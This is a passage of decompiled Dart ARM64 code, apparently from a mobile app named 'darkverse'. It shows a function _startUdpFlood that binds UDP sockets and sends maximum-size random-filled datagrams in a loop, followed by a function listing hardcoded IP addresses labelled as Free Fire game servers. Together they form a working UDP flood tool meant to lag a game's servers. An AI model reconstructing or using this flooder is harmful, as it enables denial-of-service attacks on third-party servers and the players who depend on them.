    // 0x87d73c: r0 = iterator()
    //     0x87d73c: bl              #0x5426c0  ; [dart:collection] ListBase::iterator
    // 0x87d740: mov             x1, x0
    // 0x87d744: stur            x1, [fp, #-0xd0]
    // 0x87d748: LoadField: r2 = r1->field_b
    //     0x87d748: ldur            w2, [x1, #0xb]
    // 0x87d74c: DecompressPointer r2
    //     0x87d74c: add             x2, x2, HEAP, lsl #32
    // 0x87d750: stur            x2, [fp, #-0xc8]
    // 0x87d754: LoadField: r3 = r1->field_f
    //     0x87d754: ldur            x3, [x1, #0xf]
    // 0x87d758: stur            x3, [fp, #-0xc0]
    // 0x87d75c: LoadField: r4 = r1->field_7
    //     0x87d75c: ldur            w4, [x1, #7]
    // 0x87d760: DecompressPointer r4
    //     0x87d760: add             x4, x4, HEAP, lsl #32
    // 0x87d764: stur            x4, [fp, #-0xb8]
    // 0x87d768: ldur            x5, [fp, #-0xa0]
    // 0x87d76c: stur            x5, [fp, #-0xa0]
    // 0x87d770: CheckStackOverflow
    //     0x87d770: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87d774: cmp             SP, x16
    //     0x87d778: b.ls            #0x87dc0c
    // 0x87d77c: r0 = LoadClassIdInstr(r2)
    //     0x87d77c: ldur            x0, [x2, #-1]
    //     0x87d780: ubfx            x0, x0, #0xc, #0x14
    // 0x87d784: str             x2, [SP]
    // 0x87d788: r0 = GDT[cid_x0 + 0xa57a]()
    //     0x87d788: mov             x17, #0xa57a
    //     0x87d78c: add             lr, x0, x17
    //     0x87d790: ldr             lr, [x21, lr, lsl #3]
    //     0x87d794: blr             lr
    // 0x87d798: r1 = LoadInt32Instr(r0)
    //     0x87d798: sbfx            x1, x0, #1, #0x1f
    //     0x87d79c: tbz             w0, #0, #0x87d7a4
    //     0x87d7a0: ldur            x1, [x0, #7]
    // 0x87d7a4: ldur            x3, [fp, #-0xc0]
    // 0x87d7a8: cmp             x3, x1
    // 0x87d7ac: b.ne            #0x87dbb8
    // 0x87d7b0: ldur            x4, [fp, #-0xd0]
    // 0x87d7b4: ArrayLoad: r2 = r4[0]  ; List_8
    //     0x87d7b4: ldur            x2, [x4, #0x17]
    // 0x87d7b8: cmp             x2, x1
    // 0x87d7bc: b.ge            #0x87db78
    // 0x87d7c0: ldur            x5, [fp, #-0xc8]
    // 0x87d7c4: r0 = LoadClassIdInstr(r5)
    //     0x87d7c4: ldur            x0, [x5, #-1]
    //     0x87d7c8: ubfx            x0, x0, #0xc, #0x14
    // 0x87d7cc: mov             x1, x5
    // 0x87d7d0: r0 = GDT[cid_x0 + 0xcb9c]()
    //     0x87d7d0: mov             x17, #0xcb9c
    //     0x87d7d4: add             lr, x0, x17
    //     0x87d7d8: ldr             lr, [x21, lr, lsl #3]
    //     0x87d7dc: blr             lr
    // 0x87d7e0: mov             x4, x0
    // 0x87d7e4: ldur            x3, [fp, #-0xd0]
    // 0x87d7e8: stur            x4, [fp, #-0xd8]
    // 0x87d7ec: StoreField: r3->field_1f = r0
    //     0x87d7ec: stur            w0, [x3, #0x1f]
    //     0x87d7f0: tbz             w0, #0, #0x87d80c
    //     0x87d7f4: ldurb           w16, [x3, #-1]
    //     0x87d7f8: ldurb           w17, [x0, #-1]
    //     0x87d7fc: and             x16, x17, x16, lsr #2
    //     0x87d800: tst             x16, HEAP, lsr #32
    //     0x87d804: b.eq            #0x87d80c
    //     0x87d808: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x87d80c: ArrayLoad: r0 = r3[0]  ; List_8
    //     0x87d80c: ldur            x0, [x3, #0x17]
    // 0x87d810: add             x1, x0, #1
    // 0x87d814: ArrayStore: r3[0] = r1  ; List_8
    //     0x87d814: stur            x1, [x3, #0x17]
    // 0x87d818: cmp             w4, NULL
    // 0x87d81c: b.ne            #0x87d850
    // 0x87d820: mov             x0, x4
    // 0x87d824: ldur            x2, [fp, #-0xb8]
    // 0x87d828: r1 = Null
    //     0x87d828: mov             x1, NULL
    // 0x87d82c: cmp             w2, NULL
    // 0x87d830: b.eq            #0x87d850
    // 0x87d834: ArrayLoad: r4 = r2[0]  ; List_4
    //     0x87d834: ldur            w4, [x2, #0x17]
    // 0x87d838: DecompressPointer r4
    //     0x87d838: add             x4, x4, HEAP, lsl #32
    // 0x87d83c: r8 = X0
    //     0x87d83c: ldr             x8, [PP, #0x258]  ; [pp+0x258] TypeParameter: X0
    // 0x87d840: LoadField: r9 = r4->field_7
    //     0x87d840: ldur            x9, [x4, #7]
    // 0x87d844: r3 = Null
    //     0x87d844: add             x3, PP, #0x3c, lsl #12  ; [pp+0x3c210] Null
    //     0x87d848: ldr             x3, [x3, #0x210]
    // 0x87d84c: blr             x9
    // 0x87d850: ldur            x5, [fp, #-0xa0]
    // 0x87d854: r1 = 1
    //     0x87d854: mov             x1, #1
    // 0x87d858: r0 = AllocateContext()
    //     0x87d858: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x87d85c: ldur            x5, [fp, #-0xa0]
    // 0x87d860: stur            x0, [fp, #-0xe0]
    // 0x87d864: StoreField: r0->field_b = r5
    //     0x87d864: stur            w5, [x0, #0xb]
    // 0x87d868: r0 = LoadStaticField(0x410)
    //     0x87d868: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d86c: ldr             x0, [x0, #0x820]
    // 0x87d870: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87d874: cmp             w0, w16
    // 0x87d878: b.ne            #0x87d888
    // 0x87d87c: r2 = anyIPv4
    //     0x87d87c: add             x2, PP, #0x37, lsl #12  ; [pp+0x37438] Field <_InternetAddress@16069316.anyIPv4>: static late (offset: 0x410)
    //     0x87d880: ldr             x2, [x2, #0x438]
    // 0x87d884: r0 = InitLateStaticField()
    //     0x87d884: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87d888: mov             x1, x0
    // 0x87d88c: r0 = bind()
    //     0x87d88c: bl              #0x87b0b4  ; [dart:io] _RawDatagramSocket::bind
    // 0x87d890: mov             x1, x0
    // 0x87d894: stur            x1, [fp, #-0xe8]
    // 0x87d898: r0 = Await()
    //     0x87d898: bl              #0x4a3d90  ; AwaitStub
    // 0x87d89c: mov             x1, x0
    // 0x87d8a0: ldur            x2, [fp, #-0xe0]
    // 0x87d8a4: stur            x1, [fp, #-0xe8]
    // 0x87d8a8: StoreField: r2->field_f = r0
    //     0x87d8a8: stur            w0, [x2, #0xf]
    //     0x87d8ac: tbz             w0, #0, #0x87d8c8
    //     0x87d8b0: ldurb           w16, [x2, #-1]
    //     0x87d8b4: ldurb           w17, [x0, #-1]
    //     0x87d8b8: and             x16, x17, x16, lsr #2
    //     0x87d8bc: tst             x16, HEAP, lsr #32
    //     0x87d8c0: b.eq            #0x87d8c8
    //     0x87d8c4: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x87d8c8: r0 = LoadStaticField(0xd7c)
    //     0x87d8c8: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d8cc: ldr             x0, [x0, #0x1af8]
    // 0x87d8d0: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87d8d4: cmp             w0, w16
    // 0x87d8d8: b.ne            #0x87d8e8
    // 0x87d8dc: r2 = _udpSockets
    //     0x87d8dc: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be70] Field <_FreeFireLagServerPageState@829239838._udpSockets@829239838>: static late (offset: 0xd7c)
    //     0x87d8e0: ldr             x2, [x2, #0xe70]
    // 0x87d8e4: r0 = InitLateStaticField()
    //     0x87d8e4: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87d8e8: stur            x0, [fp, #-0x100]
    // 0x87d8ec: LoadField: r2 = r0->field_b
    //     0x87d8ec: ldur            w2, [x0, #0xb]
    // 0x87d8f0: stur            x2, [fp, #-0xf8]
    // 0x87d8f4: LoadField: r1 = r0->field_f
    //     0x87d8f4: ldur            w1, [x0, #0xf]
    // 0x87d8f8: DecompressPointer r1
    //     0x87d8f8: add             x1, x1, HEAP, lsl #32
    // 0x87d8fc: LoadField: r3 = r1->field_b
    //     0x87d8fc: ldur            w3, [x1, #0xb]
    // 0x87d900: r4 = LoadInt32Instr(r2)
    //     0x87d900: sbfx            x4, x2, #1, #0x1f
    // 0x87d904: stur            x4, [fp, #-0xf0]
    // 0x87d908: r1 = LoadInt32Instr(r3)
    //     0x87d908: sbfx            x1, x3, #1, #0x1f
    // 0x87d90c: cmp             x4, x1
    // 0x87d910: b.ne            #0x87d91c
    // 0x87d914: mov             x1, x0
    // 0x87d918: r0 = _growToNextCapacity()
    //     0x87d918: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87d91c: ldur            x0, [fp, #-0x100]
    // 0x87d920: ldur            x2, [fp, #-0xf0]
    // 0x87d924: add             x1, x2, #1
    // 0x87d928: lsl             x3, x1, #1
    // 0x87d92c: StoreField: r0->field_b = r3
    //     0x87d92c: stur            w3, [x0, #0xb]
    // 0x87d930: LoadField: r1 = r0->field_f
    //     0x87d930: ldur            w1, [x0, #0xf]
    // 0x87d934: DecompressPointer r1
    //     0x87d934: add             x1, x1, HEAP, lsl #32
    // 0x87d938: ldur            x0, [fp, #-0xe8]
    // 0x87d93c: ArrayStore: r1[r2] = r0  ; List_4
    //     0x87d93c: add             x25, x1, x2, lsl #2
    //     0x87d940: add             x25, x25, #0xf
    //     0x87d944: str             w0, [x25]
    //     0x87d948: tbz             w0, #0, #0x87d964
    //     0x87d94c: ldurb           w16, [x1, #-1]
    //     0x87d950: ldurb           w17, [x0, #-1]
    //     0x87d954: and             x16, x17, x16, lsr #2
    //     0x87d958: tst             x16, HEAP, lsr #32
    //     0x87d95c: b.eq            #0x87d964
    //     0x87d960: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87d964: r0 = _nextSeed()
    //     0x87d964: bl              #0x49d0d8  ; [dart:math] _Random::_nextSeed
    // 0x87d968: mvn             x1, x0
    // 0x87d96c: lsl             x2, x0, #0x15
    // 0x87d970: add             x0, x1, x2
    // 0x87d974: lsr             x1, x0, #0x18
    // 0x87d978: eor             x2, x0, x1
    // 0x87d97c: r16 = 265
    //     0x87d97c: mov             x16, #0x109
    // 0x87d980: mul             x0, x2, x16
    // 0x87d984: lsr             x1, x0, #0xe
    // 0x87d988: eor             x2, x0, x1
    // 0x87d98c: r16 = 21
    //     0x87d98c: mov             x16, #0x15
    // 0x87d990: mul             x0, x2, x16
    // 0x87d994: lsr             x1, x0, #0x1c
    // 0x87d998: eor             x2, x0, x1
    // 0x87d99c: lsl             x0, x2, #0x1f
    // 0x87d9a0: add             x1, x2, x0
    // 0x87d9a4: cbnz            x1, #0x87d9b0
    // 0x87d9a8: r0 = 23063
    //     0x87d9a8: mov             x0, #0x5a17
    // 0x87d9ac: b               #0x87d9b4
    // 0x87d9b0: mov             x0, x1
    // 0x87d9b4: stur            x0, [fp, #-0xf0]
    // 0x87d9b8: r0 = _Random()
    //     0x87d9b8: bl              #0x49d0cc  ; Allocate_RandomStub -> _Random (size=0x10)
    // 0x87d9bc: mov             x2, x0
    // 0x87d9c0: ldur            x0, [fp, #-0xf0]
    // 0x87d9c4: stur            x2, [fp, #-0xf8]
    // 0x87d9c8: StoreField: r2->field_7 = r0
    //     0x87d9c8: stur            x0, [x2, #7]
    // 0x87d9cc: mov             x1, x2
    // 0x87d9d0: r0 = _nextState()
    //     0x87d9d0: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d9d4: ldur            x1, [fp, #-0xf8]
    // 0x87d9d8: r0 = _nextState()
    //     0x87d9d8: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d9dc: ldur            x1, [fp, #-0xf8]
    // 0x87d9e0: r0 = _nextState()
    //     0x87d9e0: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d9e4: ldur            x1, [fp, #-0xf8]
    // 0x87d9e8: r0 = _nextState()
    //     0x87d9e8: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d9ec: ldur            x1, [fp, #-0xf8]
    // 0x87d9f0: r0 = _nextState()
    //     0x87d9f0: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d9f4: ldur            x0, [fp, #-0xf8]
    // 0x87d9f8: LoadField: r1 = r0->field_7
    //     0x87d9f8: ldur            x1, [x0, #7]
    // 0x87d9fc: ubfx            x1, x1, #0, #0x20
    // 0x87da00: and             w0, w1, #0xff
    // 0x87da04: stur            x0, [fp, #-0xf0]
    // 0x87da08: r1 = <int>
    //     0x87da08: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x87da0c: r2 = 131014
    //     0x87da0c: mov             x2, #0xffc6
    //     0x87da10: movk            x2, #1, lsl #16
    // 0x87da14: r0 = AllocateArray()
    //     0x87da14: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87da18: mov             x2, x0
    // 0x87da1c: ldur            x0, [fp, #-0xf0]
    // 0x87da20: stur            x2, [fp, #-0xf8]
    // 0x87da24: lsl             w1, w0, #1
    // 0x87da28: r0 = 0
    //     0x87da28: mov             x0, #0
    // 0x87da2c: CheckStackOverflow
    //     0x87da2c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87da30: cmp             SP, x16
    //     0x87da34: b.ls            #0x87dc14
    // 0x87da38: r17 = 65507
    //     0x87da38: mov             x17, #0xffe3
    // 0x87da3c: cmp             x0, x17
    // 0x87da40: b.ge            #0x87da58
    // 0x87da44: ArrayStore: r2[r0] = r1  ; Unknown_4
    //     0x87da44: add             x3, x2, x0, lsl #2
    //     0x87da48: stur            w1, [x3, #0xf]
    // 0x87da4c: add             x3, x0, #1
    // 0x87da50: mov             x0, x3
    // 0x87da54: b               #0x87da2c
    // 0x87da58: str             NULL, [SP]
    // 0x87da5c: ldur            x1, [fp, #-0x90]
    // 0x87da60: r4 = const [0, 0x2, 0x1, 0x1, type, 0x1, null]
    //     0x87da60: ldr             x4, [PP, #0x5f68]  ; [pp+0x5f68] List(7) [0, 0x2, 0x1, 0x1, "type", 0x1, Null]
    // 0x87da64: r0 = _parseAddressString()
    //     0x87da64: bl              #0x489590  ; [dart:io] _InternetAddress::_parseAddressString
    // 0x87da68: stur            x0, [fp, #-0x100]
    // 0x87da6c: r1 = 60
    //     0x87da6c: mov             x1, #0x3c
    // 0x87da70: branchIfSmi(r0, 0x87da7c)
    //     0x87da70: tbz             w0, #0, #0x87da7c
    // 0x87da74: r1 = LoadClassIdInstr(r0)
    //     0x87da74: ldur            x1, [x0, #-1]
    //     0x87da78: ubfx            x1, x1, #0xc, #0x14
    // 0x87da7c: r17 = 4362
    //     0x87da7c: mov             x17, #0x110a
    // 0x87da80: cmp             x1, x17
    // 0x87da84: b.ne            #0x87dba4
    // 0x87da88: ldur            x4, [fp, #-0xd8]
    // 0x87da8c: r7 = LoadInt32Instr(r4)
    //     0x87da8c: sbfx            x7, x4, #1, #0x1f
    //     0x87da90: tbz             w4, #0, #0x87da98
    //     0x87da94: ldur            x7, [x4, #7]
    // 0x87da98: r17 = -264
    //     0x87da98: mov             x17, #-0x108
    // 0x87da9c: str             x7, [fp, x17]
    // 0x87daa0: r9 = 0
    //     0x87daa0: mov             x9, #0
    // 0x87daa4: ldur            x8, [fp, #-0xe8]
    // 0x87daa8: stur            x9, [fp, #-0xf0]
    // 0x87daac: CheckStackOverflow
    //     0x87daac: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87dab0: cmp             SP, x16
    //     0x87dab4: b.ls            #0x87dc1c
    // 0x87dab8: cmp             x9, #0x64
    // 0x87dabc: b.ge            #0x87db30
    // 0x87dac0: LoadField: r1 = r8->field_b
    //     0x87dac0: ldur            w1, [x8, #0xb]
    // 0x87dac4: DecompressPointer r1
    //     0x87dac4: add             x1, x1, HEAP, lsl #32
    // 0x87dac8: ldur            x2, [fp, #-0xf8]
    // 0x87dacc: mov             x5, x0
    // 0x87dad0: mov             x6, x7
    // 0x87dad4: r3 = 65507
    //     0x87dad4: mov             x3, #0xffe3
    // 0x87dad8: r0 = send()
    //     0x87dad8: bl              #0x87dc24  ; [dart:io] _NativeSocket::send
    // 0x87dadc: r0 = LoadStaticField(0xd70)
    //     0x87dadc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87dae0: ldr             x0, [x0, #0x1ae0]
    // 0x87dae4: r1 = LoadInt32Instr(r0)
    //     0x87dae4: sbfx            x1, x0, #1, #0x1f
    //     0x87dae8: tbz             w0, #0, #0x87daf0
    //     0x87daec: ldur            x1, [x0, #7]
    // 0x87daf0: add             x2, x1, #1
    // 0x87daf4: r0 = BoxInt64Instr(r2)
    //     0x87daf4: sbfiz           x0, x2, #1, #0x1f
    //     0x87daf8: cmp             x2, x0, asr #1
    //     0x87dafc: b.eq            #0x87db08
    //     0x87db00: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x87db04: stur            x2, [x0, #7]
    // 0x87db08: mov             x2, x0
    // 0x87db0c: StoreStaticField(0xd70, r2)
    //     0x87db0c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87db10: str             x2, [x0, #0x1ae0]
    // 0x87db14: ldur            x0, [fp, #-0xf0]
    // 0x87db18: add             x9, x0, #1
    // 0x87db1c: ldur            x4, [fp, #-0xd8]
    // 0x87db20: ldur            x0, [fp, #-0x100]
    // 0x87db24: r17 = -264
    //     0x87db24: mov             x17, #-0x108
    // 0x87db28: ldr             x7, [fp, x17]
    // 0x87db2c: b               #0x87daa4
    // 0x87db30: ldur            x2, [fp, #-0xe0]
    // 0x87db34: r1 = Function '<anonymous closure>': static.
    //     0x87db34: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c220] AnonymousClosure: static (0x87dec4), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startUdpFlood (0x87d4fc)
    //     0x87db38: ldr             x1, [x1, #0x220]
    // 0x87db3c: r0 = AllocateClosure()
    //     0x87db3c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87db40: str             x0, [SP]
    // 0x87db44: r1 = <Null?>
    //     0x87db44: ldr             x1, [PP, #0x880]  ; [pp+0x880] TypeArguments: <Null?>
    // 0x87db48: r2 = Instance_Duration
    //     0x87db48: add             x2, PP, #0x25, lsl #12  ; [pp+0x250c8] Obj!Duration@a441c1
    //     0x87db4c: ldr             x2, [x2, #0xc8]
    // 0x87db50: r4 = const [0, 0x3, 0x1, 0x3, null]
    //     0x87db50: ldr             x4, [PP, #0xb20]  ; [pp+0xb20] List(5) [0, 0x3, 0x1, 0x3, Null]
    // 0x87db54: r0 = Future.delayed()
    //     0x87db54: bl              #0x50479c  ; [dart:async] Future::Future.delayed
    // 0x87db58: b               #0x87db60
    // 0x87db5c: sub             SP, fp, #0x110
    // 0x87db60: ldur            x5, [fp, #-0xa0]
    // 0x87db64: ldur            x1, [fp, #-0xd0]
    // 0x87db68: ldur            x4, [fp, #-0xb8]
    // 0x87db6c: ldur            x2, [fp, #-0xc8]
    // 0x87db70: ldur            x3, [fp, #-0xc0]
    // 0x87db74: b               #0x87d76c
    // 0x87db78: mov             x1, x4
    // 0x87db7c: StoreField: r1->field_1f = rNULL
    //     0x87db7c: stur            NULL, [x1, #0x1f]
    // 0x87db80: ldur            x5, [fp, #-0xa0]
    // 0x87db84: ldur            x2, [fp, #-0x98]
    // 0x87db88: ldur            x3, [fp, #-0xb0]
    // 0x87db8c: ldur            x4, [fp, #-0xa8]
    // 0x87db90: b               #0x87d690
    // 0x87db94: mov             x2, x3
    // 0x87db98: StoreField: r2->field_1f = rNULL
    //     0x87db98: stur            NULL, [x2, #0x1f]
    // 0x87db9c: r0 = Null
    //     0x87db9c: mov             x0, NULL
    // 0x87dba0: r0 = ReturnAsyncNotFuture()
    //     0x87dba0: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87dba4: ldur            x1, [fp, #-0xd0]
    // 0x87dba8: ldur            x2, [fp, #-0xb0]
    // 0x87dbac: ldur            x0, [fp, #-0x100]
    // 0x87dbb0: r0 = Throw()
    //     0x87dbb0: bl              #0xbf5dcc  ; ThrowStub
    // 0x87dbb4: brk             #0
    // 0x87dbb8: ldur            x0, [fp, #-0xc8]
    // 0x87dbbc: r0 = ConcurrentModificationError()
    //     0x87dbbc: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87dbc0: mov             x1, x0
    // 0x87dbc4: ldur            x0, [fp, #-0xc8]
    // 0x87dbc8: StoreField: r1->field_b = r0
    //     0x87dbc8: stur            w0, [x1, #0xb]
    // 0x87dbcc: mov             x0, x1
    // 0x87dbd0: r0 = Throw()
    //     0x87dbd0: bl              #0xbf5dcc  ; ThrowStub
    // 0x87dbd4: brk             #0
    // 0x87dbd8: mov             x0, x2
    // 0x87dbdc: r0 = ConcurrentModificationError()
    //     0x87dbdc: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87dbe0: mov             x1, x0
    // 0x87dbe4: ldur            x0, [fp, #-0x98]
    // 0x87dbe8: StoreField: r1->field_b = r0
    //     0x87dbe8: stur            w0, [x1, #0xb]
    // 0x87dbec: mov             x0, x1
    // 0x87dbf0: r0 = Throw()
    //     0x87dbf0: bl              #0xbf5dcc  ; ThrowStub
    // 0x87dbf4: brk             #0
    // 0x87dbf8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87dbf8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87dbfc: b               #0x87d620
    // 0x87dc00: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87dc00: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87dc04: b               #0x87d6a0
    // 0x87dc08: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87dc08: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
    // 0x87dc0c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87dc0c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87dc10: b               #0x87d77c
    // 0x87dc14: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87dc14: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87dc18: b               #0x87da38
    // 0x87dc1c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87dc1c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87dc20: b               #0x87dab8
  }
  [closure] static Null <anonymous closure>(dynamic) {
    // ** addr: 0x87dec4, size: 0x7c
    // 0x87dec4: EnterFrame
    //     0x87dec4: stp             fp, lr, [SP, #-0x10]!
    //     0x87dec8: mov             fp, SP
    // 0x87decc: AllocStack(0x8)
    //     0x87decc: sub             SP, SP, #8
    // 0x87ded0: SetupParameters([dynamic _ /* r0 */])
    //     0x87ded0: ldr             x0, [fp, #0x10]
    //     0x87ded4: ldur            w1, [x0, #0x17]
    //     0x87ded8: add             x1, x1, HEAP, lsl #32
    // 0x87dedc: CheckStackOverflow
    //     0x87dedc: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87dee0: cmp             SP, x16
    //     0x87dee4: b.ls            #0x87df38
    // 0x87dee8: LoadField: r0 = r1->field_f
    //     0x87dee8: ldur            w0, [x1, #0xf]
    // 0x87deec: DecompressPointer r0
    //     0x87deec: add             x0, x0, HEAP, lsl #32
    // 0x87def0: mov             x1, x0
    // 0x87def4: stur            x0, [fp, #-8]
    // 0x87def8: r0 = close()
    //     0x87def8: bl              #0x877f50  ; [dart:io] _RawDatagramSocket::close
    // 0x87defc: r0 = LoadStaticField(0xd7c)
    //     0x87defc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87df00: ldr             x0, [x0, #0x1af8]
    // 0x87df04: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87df08: cmp             w0, w16
    // 0x87df0c: b.ne            #0x87df1c
    // 0x87df10: r2 = _udpSockets
    //     0x87df10: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be70] Field <_FreeFireLagServerPageState@829239838._udpSockets@829239838>: static late (offset: 0xd7c)
    //     0x87df14: ldr             x2, [x2, #0xe70]
    // 0x87df18: r0 = InitLateStaticField()
    //     0x87df18: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87df1c: mov             x1, x0
    // 0x87df20: ldur            x2, [fp, #-8]
    // 0x87df24: r0 = remove()
    //     0x87df24: bl              #0x51ee4c  ; [dart:core] _GrowableList::remove
    // 0x87df28: r0 = Null
    //     0x87df28: mov             x0, NULL
    // 0x87df2c: LeaveFrame
    //     0x87df2c: mov             SP, fp
    //     0x87df30: ldp             fp, lr, [SP], #0x10
    // 0x87df34: ret
    //     0x87df34: ret             
    // 0x87df38: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87df38: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87df3c: b               #0x87dee8
  }
  static List<String> freefireServers() {
    // ** addr: 0x87dfa4, size: 0xd4
    // 0x87dfa4: EnterFrame
    //     0x87dfa4: stp             fp, lr, [SP, #-0x10]!
    //     0x87dfa8: mov             fp, SP
    // 0x87dfac: AllocStack(0x8)
    //     0x87dfac: sub             SP, SP, #8
    // 0x87dfb0: r0 = 24
    //     0x87dfb0: mov             x0, #0x18
    // 0x87dfb4: mov             x2, x0
    // 0x87dfb8: r1 = <String>
    //     0x87dfb8: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87dfbc: r0 = AllocateArray()
    //     0x87dfbc: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87dfc0: stur            x0, [fp, #-8]
    // 0x87dfc4: r16 = "203.116.115.10"
    //     0x87dfc4: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c230] "203.116.115.10"
    //     0x87dfc8: ldr             x16, [x16, #0x230]
    // 0x87dfcc: StoreField: r0->field_f = r16
    //     0x87dfcc: stur            w16, [x0, #0xf]
    // 0x87dfd0: r16 = "203.116.115.11"
    //     0x87dfd0: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c238] "203.116.115.11"
    //     0x87dfd4: ldr             x16, [x16, #0x238]
    // 0x87dfd8: StoreField: r0->field_13 = r16
    //     0x87dfd8: stur            w16, [x0, #0x13]
    // 0x87dfdc: r16 = "203.116.115.12"
    //     0x87dfdc: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c240] "203.116.115.12"
    //     0x87dfe0: ldr             x16, [x16, #0x240]
    // 0x87dfe4: ArrayStore: r0[0] = r16  ; List_4
    //     0x87dfe4: stur            w16, [x0, #0x17]
    // 0x87dfe8: r16 = "47.246.0.10"
    //     0x87dfe8: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c248] "47.246.0.10"
    //     0x87dfec: ldr             x16, [x16, #0x248]
    // 0x87dff0: StoreField: r0->field_1b = r16
    //     0x87dff0: stur            w16, [x0, #0x1b]
    // 0x87dff4: r16 = "47.246.0.11"
    //     0x87dff4: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c250] "47.246.0.11"
    //     0x87dff8: ldr             x16, [x16, #0x250]
    // 0x87dffc: StoreField: r0->field_1f = r16
    //     0x87dffc: stur            w16, [x0, #0x1f]
    // 0x87e000: r16 = "47.246.0.12"
    //     0x87e000: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c258] "47.246.0.12"
    //     0x87e004: ldr             x16, [x16, #0x258]
    // 0x87e008: StoreField: r0->field_23 = r16
    //     0x87e008: stur            w16, [x0, #0x23]
    // 0x87e00c: r16 = "103.219.76.10"
    //     0x87e00c: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c260] "103.219.76.10"
    //     0x87e010: ldr             x16, [x16, #0x260]
    // 0x87e014: StoreField: r0->field_27 = r16
    //     0x87e014: stur            w16, [x0, #0x27]
    // 0x87e018: r16 = "103.219.76.11"
    //     0x87e018: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c268] "103.219.76.11"
    //     0x87e01c: ldr             x16, [x16, #0x268]
    // 0x87e020: StoreField: r0->field_2b = r16
    //     0x87e020: stur            w16, [x0, #0x2b]
    // 0x87e024: r16 = "52.74.0.10"
    //     0x87e024: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c270] "52.74.0.10"
    //     0x87e028: ldr             x16, [x16, #0x270]
    // 0x87e02c: StoreField: r0->field_2f = r16
    //     0x87e02c: stur            w16, [x0, #0x2f]
    // 0x87e030: r16 = "54.254.0.10"
    //     0x87e030: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c278] "54.254.0.10"
    //     0x87e034: ldr             x16, [x16, #0x278]
    // 0x87e038: StoreField: r0->field_33 = r16
    //     0x87e038: stur            w16, [x0, #0x33]
    // 0x87e03c: r16 = "13.228.0.10"
    //     0x87e03c: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c280] "13.228.0.10"
    //     0x87e040: ldr             x16, [x16, #0x280]
    // 0x87e044: StoreField: r0->field_37 = r16
    //     0x87e044: stur            w16, [x0, #0x37]
    // 0x87e048: r16 = "18.138.0.10"
    //     0x87e048: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c288] "18.138.0.10"
    //     0x87e04c: ldr             x16, [x16, #0x288]
    // 0x87e050: StoreField: r0->field_3b = r16
    //     0x87e050: stur            w16, [x0, #0x3b]
    // 0x87e054: r1 = <String>
    //     0x87e054: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87e058: r0 = AllocateGrowableArray()
